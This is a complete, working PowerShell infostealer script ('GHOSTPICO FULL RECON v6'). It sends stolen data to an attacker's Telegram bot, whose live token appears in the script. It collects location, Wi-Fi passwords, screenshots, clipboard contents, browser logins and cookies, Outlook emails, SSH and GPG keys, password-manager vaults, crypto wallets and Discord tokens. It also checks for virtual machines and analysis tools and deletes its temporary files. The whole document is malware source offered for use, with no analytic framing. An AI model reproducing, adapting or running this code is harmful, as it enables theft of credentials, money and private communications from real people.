if($Host.Name -eq 'ConsoleHost'){
$pl=@'
param([int]$m=3)
$t='8739612567:AAHoXjqe494-2sqrbj4J91UfzXqParw0sis'
$c='6525313086'
$u='https://api.telegram.org/bot'+$t

function Send-File($f){
try{
$fn=[System.IO.Path]::GetFileName($f)
$boundary='----WebKitFormBoundary'+[System.Guid]::NewGuid().ToString()
$lf=[System.Environment]::NewLine
$fileBytes=[System.IO.File]::ReadAllBytes($f)
$fileContent=[System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
$body='--'+$boundary+$lf
$body+='Content-Disposition: form-data; name="document"; filename="'+$fn+'"'+$lf
$body+='Content-Type: application/octet-stream'+$lf+$lf
$body+=$fileContent+$lf
$body+='--'+$boundary+'--'+$lf
$bytes=[System.Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($body)
$request=[System.Net.WebRequest]::Create($u+'/sendDocument?chat_id='+$c)
$request.Method='POST'
$request.ContentType='multipart/form-data; boundary='+$boundary
$request.ContentLength=$bytes.Length
$stream=$request.GetRequestStream()
$stream.Write($bytes,0,$bytes.Length)
$stream.Close()
$response=$request.GetResponse()
$response.Close()
}catch{Send-Text('FAIL:'+$fn)}
}

function Send-Text($m){
try{
$w=New-Object Net.WebClient
$url=$u+'/sendMessage?chat_id='+$c+[char]38+'text='+$m
$w.UploadString($url,'POST','')
}catch{}
}

function Exfil($path,$exts,$label,$max){
$files=Get-ChildItem $path -Recurse -File -ea 0|Where-Object{$_.Extension -in $exts}|Select-Object -First $max
Send-Text($label+':'+$files.Count)
$i=0
foreach($f in $files){Send-File $f.FullName;$i++;Send-Text($label+' '+$i);Start-Sleep -m 600}
Send-Text($label+'-DONE')
}

function Capture-Screen($label){
try{
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap=New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$graphics=[System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location,[System.Drawing.Point]::Empty,$screen.Size)
$path=$env:TEMP+'\scr_'+$label+'.png'
$bitmap.Save($path,[System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
Send-Text 'SCREENSHOT:'+$label
Send-File $path
Remove-Item $path -Force -ea 0
}catch{Send-Text 'SCREENSHOT_FAIL:'+$label}
}

# ========== LOCATION RECON ==========
Send-Text '===LOCATION DATA==='

try {
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -TimeoutSec 10).ip
    $geo = Invoke-RestMethod -Uri "https://ipapi.co/$ip/json/" -TimeoutSec 10
    Send-Text "IP:$ip"
    Send-Text "CITY:$($geo.city)"
    Send-Text "REGION:$($geo.region)"
    Send-Text "COUNTRY:$($geo.country_name)"
    Send-Text "LAT:$($geo.latitude)"
    Send-Text "LON:$($geo.longitude)"
    Send-Text "ISP:$($geo.org)"
    Send-Text "VPN/PROXY:$($geo.security.vpn) $($geo.security.proxy)"
    if ($geo.latitude -and $geo.longitude) {
        $mapsLink = "https://maps.google.com/?q=$($geo.latitude),$($geo.longitude)"
        Send-Text "MAPS:$mapsLink"
    }
} catch { Send-Text "IP-GEO:FAIL" }

try {
    Add-Type -AssemblyName System.Device -ErrorAction Stop
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $watcher.Start()
    Start-Sleep -Seconds 5
    if ($watcher.Position.Location.IsUnknown -eq $false) {
        $loc = $watcher.Position.Location
        Send-Text "GPS-LAT:$($loc.Latitude)"
        Send-Text "GPS-LON:$($loc.Longitude)"
        Send-Text "GPS-ACC:$($loc.HorizontalAccuracy)m"
        $mapsLink = "https://maps.google.com/?q=$($loc.Latitude),$($loc.Longitude)"
        Send-Text "MAPS-GPS:$mapsLink"
    } else {
        Send-Text "GPS:NO_SIGNAL"
    }
    $watcher.Stop()
} catch { Send-Text "GPS:NOT_AVAILABLE" }

try {
    $wifi = netsh wlan show networks mode=Bssid | Out-String
    Send-Text "WIFI_NETWORKS:$($wifi.Length)chars"
    $networks = $wifi | Select-String "SSID\s+\d+\s+:\s(.+)" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    Send-Text "WIFI-SSIDs:$($networks -join ', ')"
} catch { Send-Text "WIFI:FAIL" }

Capture-Screen 'LOCATION'

# ========== PHASE 1: SYSTEM ==========
Send-Text '===PHASE1:SYSTEM==='
$r=@()
$r+='========================================'
$r+='GHOSTPICO FULL RECON v6'
$r+='Time:'+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
$r+='========================================'
$r+=''
$r+='===BASIC SYSTEM==='
try{
$os=Get-CimInstance Win32_OperatingSystem
$cs=Get-CimInstance Win32_ComputerSystem
$bios=Get-CimInstance Win32_BIOS
$proc=Get-CimInstance Win32_Processor
$r+='PC:'+$env:COMPUTERNAME
$r+='User:'+$env:USERNAME
$r+='Domain:'+$env:USERDOMAIN
$r+='OS:'+$os.Caption
$r+='Ver:'+$os.Version
$r+='Build:'+$os.BuildNumber
$r+='Arch:'+$env:PROCESSOR_ARCHITECTURE
$r+='Type:'+$cs.SystemType
$r+='Mfg:'+$cs.Manufacturer
$r+='Model:'+$cs.Model
$r+='BIOS:'+$bios.Manufacturer+' '+$bios.SMBIOSBIOSVersion
$r+='Serial:'+$bios.SerialNumber
$r+='CPU:'+$proc.Name
$r+='Cores:'+$proc.NumberOfCores
$r+='Logical:'+$proc.NumberOfLogicalProcessors
$r+='RAM:'+[math]::Round($cs.TotalPhysicalMemory/1GB,2)+'GB'
$r+='FreeRAM:'+[math]::Round($os.FreePhysicalMemory/1MB,2)+'GB'
$r+='Boot:'+$os.LastBootUpTime
$r+='Install:'+$os.InstallDate
$r+='TZ:'+(Get-TimeZone).DisplayName
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===PS ENV==='
$r+='PSVer:'+$PSVersionTable.PSVersion
$r+='PSEdition:'+$PSVersionTable.PSEdition
$r+='CLR:'+$PSVersionTable.CLRVersion
$r+='Host:'+$Host.Name
$r+='ExecPolicy:'+(Get-ExecutionPolicy)
$r+=''

# ========== PHASE 2: NETWORK ==========
Send-Text '===PHASE2:NETWORK==='
$r+='===NETWORK ADAPTERS==='
try{
$nics=Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True'
foreach($nic in $nics){
$r+='---'
$r+='Desc:'+$nic.Description
$r+='MAC:'+$nic.MACAddress
$r+='IP:'+($nic.IPAddress -join ',')
$r+='Mask:'+($nic.IPSubnet -join ',')
$r+='GW:'+($nic.DefaultIPGateway -join ',')
$r+='DNS:'+($nic.DNSServerSearchOrder -join ',')
$r+='DHCP:'+$nic.DHCPEnabled
$r+='DHCPSrv:'+$nic.DHCPServer
}
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===WIFI PASSWORDS==='
try{
$pr=(netsh wlan show profiles)|Select-String 'All User Profile\s+:\s(.+)$'
if($pr){
foreach($p in $pr){
$n=$p.Matches.Groups[1].Value.Trim()
$d=netsh wlan show profile name="$n" key=clear
$pw=($d|Select-String 'Key Content\s+:\s(.+)$').Matches.Groups[1].Value.Trim()
$au=($d|Select-String 'Authentication\s+:\s(.+)$').Matches.Groups[1].Value.Trim()
$ci=($d|Select-String 'Cipher\s+:\s(.+)$').Matches.Groups[1].Value.Trim()
if(!$pw){$pw='[OPEN]'}
$r+='SSID:'+$n+'|PASS:'+$pw+'|AUTH:'+$au+'|CIPHER:'+$ci
}
}else{$r+='NONE'}
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===IPCONFIG==='
$r+=(ipconfig /all|Out-String)
$r+=''
$r+='===ARP==='
$r+=(arp -a|Out-String)
$r+=''
$r+='===ROUTES==='
$r+=(route print|Out-String)
$r+=''
$r+='===NETSTAT==='
$r+=(netstat -ano|Out-String)
$r+=''

# ========== PHASE 3: USERS ==========
Send-Text '===PHASE3:USERS==='
$r+='===LOCAL USERS==='
$r+=(net user|Out-String)
$r+=''
$r+='===GROUPS==='
$r+=(net localgroup|Out-String)
$r+=''
$r+='===ADMINS==='
$r+=(net localgroup administrators|Out-String)
$r+=''
$r+='===RDP USERS==='
$r+=(net localgroup "Remote Desktop Users" 2>$null|Out-String)
$r+=''
$r+='===DETAILED USERS==='
try{
$us=Get-CimInstance Win32_UserAccount
foreach($u1 in $us){
$r+='Name:'+$u1.Name+'|Full:'+$u1.FullName+'|Domain:'+$u1.Domain+'|SID:'+$u1.SID+'|Disabled:'+$u1.Disabled+'|Lock:'+$u1.Lockout
}
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''

Capture-Screen 'SYSTEM'

# ========== PHASE 4: PROCESSES ==========
Send-Text '===PHASE4:PROCS==='
$r+='===PROCESSES==='
try{
$ps=Get-Process|Select-Object Name,Id,Path,Company,@{N='CPU';E={$_.CPU}},@{N='RAM';E={[math]::Round($_.WorkingSet64/1MB,2)}}
$r+=($ps|Format-Table -AutoSize|Out-String)
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===SERVICES==='
try{
$sv=Get-CimInstance Win32_Service -Filter "State='Running'"|Select-Object Name,DisplayName,StartMode,StartName,PathName
$r+=($sv|Format-Table -AutoSize|Out-String)
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===STARTUP==='
try{
$su=Get-CimInstance Win32_StartupCommand|Select-Object Name,Command,Location,User
$r+=($su|Format-Table -AutoSize|Out-String)
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''

# ========== PHASE 5: STORAGE ==========
Send-Text '===PHASE5:STORAGE==='
$r+='===DISKS==='
try{
$dk=Get-CimInstance Win32_LogicalDisk|Select-Object DeviceID,@{N='SizeGB';E={[math]::Round($_.Size/1GB,2)}},@{N='FreeGB';E={[math]::Round($_.FreeSpace/1GB,2)}},@{N='Used%';E={[math]::Round((($_.Size-$_.FreeSpace)/$_.Size)*100,1)}},FileSystem
$r+=($dk|Format-Table -AutoSize|Out-String)
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===USB HISTORY==='
try{
$uk=Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR'
foreach($k in $uk){
$r+='Dev:'+$k.PSChildName
$sk=Get-ChildItem $k.PSPath
foreach($s in $sk){
$fn=(Get-ItemProperty $s.PSPath).FriendlyName
$r+='  Inst:'+$s.PSChildName+'|Name:'+$fn
}
}
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''

# ========== PHASE 6: SOFTWARE ==========
Send-Text '===PHASE6:SOFTWARE==='
$r+='===HOTFIXES==='
try{
$hf=Get-CimInstance Win32_QuickFixEngineering|Select-Object HotFixID,Description,InstalledBy,InstalledOn
$r+=($hf|Format-Table -AutoSize|Out-String)
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===INSTALLED SOFTWARE==='
try{
$rp=@('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*')
foreach($p in $rp){
$it=Get-ItemProperty $p|Where-Object{$_.DisplayName}|Select-Object DisplayName,DisplayVersion,Publisher,InstallDate
foreach($i in $it){$r+=$i.DisplayName+'|v'+$i.DisplayVersion+'|'+$i.Publisher}
}
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''

# ========== PHASE 7: SECURITY ==========
Send-Text '===PHASE7:SECURITY==='
$r+='===DEFENDER==='
try{
$df=Get-MpComputerStatus
$r+='RT:'+$df.RealTimeProtectionEnabled+'|Behav:'+$df.BehaviorMonitorEnabled+'|AV:'+$df.AntivirusEnabled+'|AS:'+$df.AntispywareEnabled+'|NIS:'+$df.NISEnabled+'|Sig:'+$df.AntivirusSignatureLastUpdated
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===DEFENDER EXCLUSIONS==='
try{
$mp=Get-MpPreference
$r+='Paths:'+($mp.ExclusionPath -join ',')
$r+='Exts:'+($mp.ExclusionExtension -join ',')
$r+='Procs:'+($mp.ExclusionProcess -join ',')
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''
$r+='===UAC==='
try{
$uc=Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
$r+='EnableLUA:'+$uc.EnableLUA+'|ConsentAdmin:'+$uc.ConsentPromptBehaviorAdmin+'|SecureDesktop:'+$uc.PromptOnSecureDesktop
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''

# ========== PHASE 8: CLIPBOARD ==========
Send-Text '===PHASE8:CLIPBOARD==='
$r+='===CLIPBOARD==='
try{
Add-Type -AssemblyName System.Windows.Forms
$cb=[System.Windows.Forms.Clipboard]::GetText()
if($cb){$r+='CLIP('+ $cb.Length+'):'+$cb.Substring(0,[Math]::Min(1000,$cb.Length))}else{$r+='EMPTY'}
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''

# ========== PHASE 9: ENV ==========
Send-Text '===PHASE9:ENV==='
$r+='===ENV VARS==='
$r+=(Get-ChildItem Env:|Out-String)
$r+=''
$r+='===RECENT DOCS==='
try{
$rd=Get-ChildItem ($env:APPDATA+'\Microsoft\Windows\Recent') -Filter '*.lnk'|Select-Object -First 30 Name,LastAccessTime
foreach($f in $rd){$r+=$f.Name+'|'+$f.LastAccessTime}
}catch{$r+='ERR:'+$_.Exception.Message}
$r+=''

# ========== PHASE 10: REPORT ==========
Send-Text '===PHASE10:REPORT==='
$rf=$env:TEMP+'\recon_full.txt'
$r|Out-File -FilePath $rf -Encoding UTF8
Send-Text 'RECON:'+[math]::Round((Get-Item $rf).Length/1KB,2)+'KB'
Send-File $rf
Remove-Item $rf -Force

# ========== PHASE 11: BROWSER DATA ==========
Send-Text '===PHASE11:BROWSER DATA==='
$cl=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data'
if(Test-Path $cl){Send-Text 'CHROME LOGIN DATA';Send-File $cl}else{Send-Text 'NO CHROME LOGIN DATA'}
$cc=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Cookies'
if(Test-Path $cc){Send-Text 'CHROME COOKIES';Send-File $cc}else{Send-Text 'NO CHROME COOKIES'}
$ch=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\History'
if(Test-Path $ch){Send-Text 'CHROME HISTORY';Send-File $ch}else{Send-Text 'NO CHROME HISTORY'}
$cbm=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Bookmarks'
if(Test-Path $cbm){Send-Text 'CHROME BOOKMARKS';Send-File $cbm}else{Send-Text 'NO CHROME BOOKMARKS'}
$el=$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default\Login Data'
if(Test-Path $el){Send-Text 'EDGE LOGIN DATA';Send-File $el}else{Send-Text 'NO EDGE LOGIN DATA'}
$ec=$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default\Cookies'
if(Test-Path $ec){Send-Text 'EDGE COOKIES';Send-File $ec}else{Send-Text 'NO EDGE COOKIES'}
$eh=$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default\History'
if(Test-Path $eh){Send-Text 'EDGE HISTORY';Send-File $eh}else{Send-Text 'NO EDGE HISTORY'}
$ebm=$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default\Bookmarks'
if(Test-Path $ebm){Send-Text 'EDGE BOOKMARKS';Send-File $ebm}else{Send-Text 'NO EDGE BOOKMARKS'}

$r2=@()
$r2+='===FIREFOX DATA==='
try{
$ff=$env:APPDATA+'\Mozilla\Firefox\Profiles'
if(Test-Path $ff){
$fp=Get-ChildItem $ff -Directory
foreach($p in $fp){
$r2+='Profile:'+$p.Name
$fl=Get-ChildItem $p.FullName -File|Select-Object Name,Length
foreach($f in $fl){$r2+='  '+$f.Name+'('+ $f.Length+')'}
$logins=$p.FullName+'\logins.json'
if(Test-Path $logins){Send-Text 'FIREFOX LOGINS:'+$p.Name;Send-File $logins}
$cookies=$p.FullName+'\cookies.sqlite'
if(Test-Path $cookies){Send-Text 'FIREFOX COOKIES:'+$p.Name;Send-File $cookies}
$places=$p.FullName+'\places.sqlite'
if(Test-Path $places){Send-Text 'FIREFOX HISTORY:'+$p.Name;Send-File $places}
$key4=$p.FullName+'\key4.db'
if(Test-Path $key4){Send-Text 'FIREFOX KEY4:'+$p.Name;Send-File $key4}
}
}else{$r2+='NO FIREFOX'}
}catch{$r2+='ERR:'+$_.Exception.Message}
$ffr=$env:TEMP+'\recon_ff.txt'
$r2|Out-File -FilePath $ffr -Encoding UTF8
Send-File $ffr
Remove-Item $ffr -Force

Capture-Screen 'BROWSER'

# ========== PHASE 12: EMAIL CLIENTS (WITH REAL EMAIL READING) ==========
Send-Text '===PHASE12:EMAIL CLIENTS==='

# 12a. OUTLOOK COM OBJECT - READ ACTUAL EMAILS
try {
    Send-Text 'OUTLOOK_COM:TRYING'
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $inbox = $namespace.GetDefaultFolder(6)  # 6 = olFolderInbox
    $items = $inbox.Items | Select-Object -First 10 Subject, SenderName, ReceivedTime, Body
    Send-Text "OUTLOOK_INBOX_COUNT:$($inbox.Items.Count)"
    foreach ($e in $items) {
        $subj = $e.Subject
        $sender = $e.SenderName
        $date = $e.ReceivedTime
        $body = $e.Body
        if ($body.Length -gt 200) { $body = $body.Substring(0,200) + '...' }
        Send-Text "EMAIL|FROM:$sender|SUBJ:$subj|DATE:$date|BODY:$body"
    }
    # Also try Sent Items
    $sent = $namespace.GetDefaultFolder(5)  # 5 = olFolderSentMail
    Send-Text "OUTLOOK_SENT_COUNT:$($sent.Items.Count)"
} catch { Send-Text 'OUTLOOK_COM:FAIL-' + $_.Exception.Message }

# 12b. OUTLOOK FILE EXTRACTION (.pst/.ost)
$r3=@()
$r3+='===OUTLOOK FILES==='
try{
$olk=$env:LOCALAPPDATA+'\Microsoft\Outlook'
if(Test-Path $olk){
$of=Get-ChildItem $olk -Recurse -File -ea 0|Select-Object FullName,Length
foreach($f in $of){$r3+=$f.FullName+'('+ $f.Length+')'}
Exfil $olk @('.pst','.ost','.nk2','.srs') 'OUTLOOK' 10
}else{$r3+='NO OUTLOOK FILES'}
}catch{$r3+='ERR:'+$_.Exception.Message}
$r3+=''

# 12c. THUNDERBIRD
try{
$tb=$env:APPDATA+'\Thunderbird\Profiles'
if(Test-Path $tb){
$tp=Get-ChildItem $tb -Directory
foreach($p in $tp){
$r3+='Profile:'+$p.Name
$tbf=Get-ChildItem $p.FullName -File|Select-Object Name,Length
foreach($f in $tbf){$r3+='  '+$f.Name+'('+ $f.Length+')'}
}
Exfil $tb @('.sqlite','.json','.db') 'THUNDERBIRD' 10
}else{$r3+='NO THUNDERBIRD'}
}catch{$r3+='ERR:'+$_.Exception.Message}
$r3+=''

# 12d. WINDOWS MAIL
try{
$wm=$env:LOCALAPPDATA+'\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState'
if(Test-Path $wm){
$wmf=Get-ChildItem $wm -Recurse -File -ea 0|Select-Object FullName,Length
foreach($f in $wmf){$r3+=$f.FullName+'('+ $f.Length+')'}
Exfil $wm @('.db','.sqlite','.edb') 'WINMAIL' 10
}else{$r3+='NO WINMAIL'}
}catch{$r3+='ERR:'+$_.Exception.Message}
$emr=$env:TEMP+'\recon_email.txt'
$r3|Out-File -FilePath $emr -Encoding UTF8
Send-File $emr
Remove-Item $emr -Force

# ========== PHASE 13: CREDENTIALS ==========
Send-Text '===PHASE13:CREDENTIALS==='
$r4=@()
$r4+='===WINDOWS CREDENTIALS==='
try{
$cmdkey=cmdkey /list 2>$null
if($cmdkey){$r4+=$cmdkey|Out-String}else{$r4+='NONE'}
}catch{$r4+='ERR:'+$_.Exception.Message}
$r4+=''
$r4+='===VAULT==='
try{
$vaults=Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
foreach($v in $vaults){$r4+='Vault:'+$v.PSChildName}
}catch{$r4+='ERR:'+$_.Exception.Message}
$r4+=''
$r4+='===LSA SECRETS==='
try{
$lsa=Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$r4+='RunAsPPL:'+$lsa.RunAsPPL+'|LmCompat:'+$lsa.LmCompatibilityLevel
}catch{$r4+='ERR:'+$_.Exception.Message}
$r4+=''
$r4+='===SAM/SECURITY REG==='
try{
$sam='HKLM:\SAM\SAM\Domains\Account\Users'
if(Test-Path $sam){$r4+='SAM REGISTRY ACCESSIBLE'}else{$r4+='SAM REGISTRY BLOCKED'}
}catch{$r4+='ERR:'+$_.Exception.Message}
$credr=$env:TEMP+'\recon_creds.txt'
$r4|Out-File -FilePath $credr -Encoding UTF8
Send-File $credr
Remove-Item $credr -Force

Capture-Screen 'CREDENTIALS'

# ========== PHASE 14: SSH/KEYS ==========
Send-Text '===PHASE14:SSH/KEYS==='
$r5=@()
$r5+='===SSH KEYS==='
try{
$ssh=$env:USERPROFILE+'\.ssh'
if(Test-Path $ssh){
$sk=Get-ChildItem $ssh -Recurse -File -ea 0
foreach($f in $sk){$r5+=$f.FullName+'('+ $f.Length+')'}
Exfil $ssh @('','.pub','.pem','.key','.ppk') 'SSH' 20
}else{$r5+='NO SSH'}
}catch{$r5+='ERR:'+$_.Exception.Message}
$r5+=''
$r5+='===GNUPG==='
try{
$gpg=$env:APPDATA+'\gnupg'
if(Test-Path $gpg){
$gf=Get-ChildItem $gpg -Recurse -File -ea 0
foreach($f in $gf){$r5+=$f.FullName+'('+ $f.Length+')'}
Exfil $gpg @('.gpg','.asc','.pgp','.key','.sec') 'GPG' 20
}else{$r5+='NO GPG'}
}catch{$r5+='ERR:'+$_.Exception.Message}
$r5+=''
$r5+='===PUTTY==='
try{
$putty=$env:USERPROFILE+'\.putty'
if(Test-Path $putty){
$pf=Get-ChildItem $putty -Recurse -File -ea 0
foreach($f in $pf){$r5+=$f.FullName+'('+ $f.Length+')'}
}else{$r5+='NO PUTTY'}
}catch{$r5+='ERR:'+$_.Exception.Message}
$puttyReg=$env:USERPROFILE+'\Documents\putty.reg'
if(Test-Path $puttyReg){Send-Text 'PUTTY REG';Send-File $puttyReg}
$keyr=$env:TEMP+'\recon_keys.txt'
$r5|Out-File -FilePath $keyr -Encoding UTF8
Send-File $keyr
Remove-Item $keyr -Force

# ========== PHASE 15: PASSWORD MANAGERS ==========
Send-Text '===PHASE15:WALLET/PASSWORD MANAGERS==='
$r6=@()
$r6+='===1PASSWORD==='
try{
$op=$env:LOCALAPPDATA+'\1Password'
if(Test-Path $op){$r6+='FOUND:'+$op;Exfil $op @('.sqlite','.db','.json','.opvault') '1PASS' 10}else{$r6+='NO 1PASSWORD'}
}catch{$r6+='ERR:'+$_.Exception.Message}
$r6+=''
$r6+='===BITWARDEN==='
try{
$bw=$env:APPDATA+'\Bitwarden'
if(Test-Path $bw){$r6+='FOUND:'+$bw;Exfil $bw @('.json','.db','.sqlite') 'BITWARDEN' 10}else{$r6+='NO BITWARDEN'}
}catch{$r6+='ERR:'+$_.Exception.Message}
$r6+=''
$r6+='===KEEPASS==='
try{
$kp=$env:APPDATA+'\KeePass'
if(Test-Path $kp){$r6+='FOUND:'+$kp;Exfil $kp @('.kdbx','.key','.xml') 'KEEPASS' 10}else{$r6+='NO KEEPASS'}
}catch{$r6+='ERR:'+$_.Exception.Message}
$r6+=''
$r6+='===LASTPASS==='
try{
$lp=$env:LOCALAPPDATA+'\LastPass'
if(Test-Path $lp){$r6+='FOUND:'+$lp;Exfil $lp @('.sqlite','.db','.json') 'LASTPASS' 10}else{$r6+='NO LASTPASS'}
}catch{$r6+='ERR:'+$_.Exception.Message}
$r6+=''
$r6+='===DASHLANE==='
try{
$dl=$env:LOCALAPPDATA+'\Dashlane'
if(Test-Path $dl){$r6+='FOUND:'+$dl;Exfil $dl @('.db','.sqlite','.json') 'DASHLANE' 10}else{$r6+='NO DASHLANE'}
}catch{$r6+='ERR:'+$_.Exception.Message}
$walletr=$env:TEMP+'\recon_wallets.txt'
$r6|Out-File -FilePath $walletr -Encoding UTF8
Send-File $walletr
Remove-Item $walletr -Force

# ========== PHASE 16: CRYPTO WALLETS ==========
Send-Text '===PHASE16:CRYPTO WALLETS==='
$r7=@()
$r7+='===METAMASK==='
try{
$mm=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn'
if(Test-Path $mm){$r7+='FOUND METAMASK';Exfil $mm @('','.ldb','.log') 'METAMASK' 10}else{$r7+='NO METAMASK'}
}catch{$r7+='ERR:'+$_.Exception.Message}
$r7+=''
$r7+='===EXODUS==='
try{
$ex=$env:APPDATA+'\Exodus'
if(Test-Path $ex){$r7+='FOUND EXODUS';Exfil $ex @('.json','.seco','.sqlite') 'EXODUS' 10}else{$r7+='NO EXODUS'}
}catch{$r7+='ERR:'+$_.Exception.Message}
$r7+=''
$r7+='===ELECTRUM==='
try{
$ele=$env:APPDATA+'\Electrum'
if(Test-Path $ele){$r7+='FOUND ELECTRUM';Exfil $ele @('','.json','.dat') 'ELECTRUM' 10}else{$r7+='NO ELECTRUM'}
}catch{$r7+='ERR:'+$_.Exception.Message}
$r7+=''
$r7+='===ATOMIC==='
try{
$at=$env:APPDATA+'\atomic'
if(Test-Path $at){$r7+='FOUND ATOMIC';Exfil $at @('.json','.db','.sqlite') 'ATOMIC' 10}else{$r7+='NO ATOMIC'}
}catch{$r7+='ERR:'+$_.Exception.Message}
$cryptor=$env:TEMP+'\recon_crypto.txt'
$r7|Out-File -FilePath $cryptor -Encoding UTF8
Send-File $cryptor
Remove-Item $cryptor -Force

# ========== PHASE 17: DISCORD/TEAMS/SLACK + TOKENS ==========
Send-Text '===PHASE17:DISCORD/TEAMS/SLACK==='

# 17a. DISCORD TOKEN EXTRACTION (from LevelDB)
try{
$discordPaths = @(
    "$env:APPDATA\Discord\Local Storage\leveldb",
    "$env:APPDATA\DiscordCanary\Local Storage\leveldb",
    "$env:APPDATA\DiscordPTB\Local Storage\leveldb"
)
$tokenCount = 0
foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        Get-ChildItem $path -Filter "*.ldb" -ea 0 | ForEach-Object {
            $content = [System.IO.File]::ReadAllText($_.FullName)
            $tokens = [regex]::Matches($content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object { $_.Value }
            foreach ($t in $tokens) { 
                Send-Text "DISCORD_TOKEN:$t" 
                $tokenCount++
            }
        }
    }
}
if ($tokenCount -eq 0) { Send-Text 'DISCORD_TOKEN:NONE_FOUND' }
}catch{Send-Text 'DISCORD_TOKEN_ERR:'+$_.Exception.Message}

# 17b. DISCORD LOCAL STORAGE FILES
$r8=@()
$r8+='===DISCORD FILES==='
try{
$dc=$env:APPDATA+'\Discord'
if(Test-Path $dc){$r8+='FOUND DISCORD';Exfil $dc @('.ldb','.log','.json','.sqlite') 'DISCORD' 10}else{$r8+='NO DISCORD'}
}catch{$r8+='ERR:'+$_.Exception.Message}
$r8+=''
$r8+='===TEAMS==='
try{
$tm=$env:APPDATA+'\Microsoft\Teams'
if(Test-Path $tm){$r8+='FOUND TEAMS';Exfil $tm @('.ldb','.log','.json','.db') 'TEAMS' 10}else{$r8+='NO TEAMS'}
}catch{$r8+='ERR:'+$_.Exception.Message}
$r8+=''
$r8+='===SLACK==='
try{
$sl=$env:APPDATA+'\Slack'
if(Test-Path $sl){$r8+='FOUND SLACK';Exfil $sl @('.ldb','.log','.json','.db') 'SLACK' 10}else{$r8+='NO SLACK'}
}catch{$r8+='ERR:'+$_.Exception.Message}

$chatr=$env:TEMP+'\recon_chat.txt'
$r8|Out-File -FilePath $chatr -Encoding UTF8
Send-File $chatr
Remove-Item $chatr -Force

# ========== PHASE 17c: ACTIVE WINDOWS ==========
Send-Text '===PHASE17c:ACTIVE WINDOWS==='
try{
Get-Process|Where-Object{$_.MainWindowTitle -ne ''}|ForEach-Object{
Send-Text "WINDOW:$($_.ProcessName)|$($_.MainWindowTitle)"
}
}catch{Send-Text 'WINDOWS_ERR:'+$_.Exception.Message}

# ========== PHASE 17d: VM DETECTION ==========
Send-Text '===PHASE17d:VM DETECTION==='
try{
$vm=(Get-CimInstance Win32_ComputerSystem).Manufacturer
$vm2=(Get-CimInstance Win32_ComputerSystem).Model
$vm3=(Get-CimInstance Win32_BIOS).SerialNumber
if($vm -match 'VMware|VirtualBox|Hyper-V|Xen|KVM'){Send-Text "VM_DETECTED:$vm"}
if($vm2 -match 'VMware|VirtualBox|Hyper-V|Xen|KVM'){Send-Text "VM_DETECTED:$vm2"}
if($vm3 -match 'VMware|VirtualBox|Hyper-V|Xen|KVM'){Send-Text "VM_DETECTED:$vm3"}
}catch{Send-Text 'VM_ERR:'+$_.Exception.Message}

# ========== PHASE 17e: ANALYSIS TOOLS ==========
Send-Text '===PHASE17e:ANALYSIS TOOLS==='
try{
$tools=@('procmon','procexp','wireshark','fiddler','x64dbg','ollydbg','idaq','processhacker')
Get-Process|Where-Object{$_.ProcessName -in $tools}|ForEach-Object{
Send-Text "ANALYSIS_TOOL:$($_.ProcessName)"
}
}catch{Send-Text 'ANALYSIS_ERR:'+$_.Exception.Message}

# ========== PHASE 17f: CLOUD STORAGE ==========
Send-Text '===PHASE17f:CLOUD STORAGE==='
try{
$dbConfig = "$env:LOCALAPPDATA\Dropbox\info.json"
if (Test-Path $dbConfig) { Send-Text 'DROPBOX:FOUND'; Send-File $dbConfig } else { Send-Text 'DROPBOX:NO' }
}catch{Send-Text 'DROPBOX_ERR:'+$_.Exception.Message}

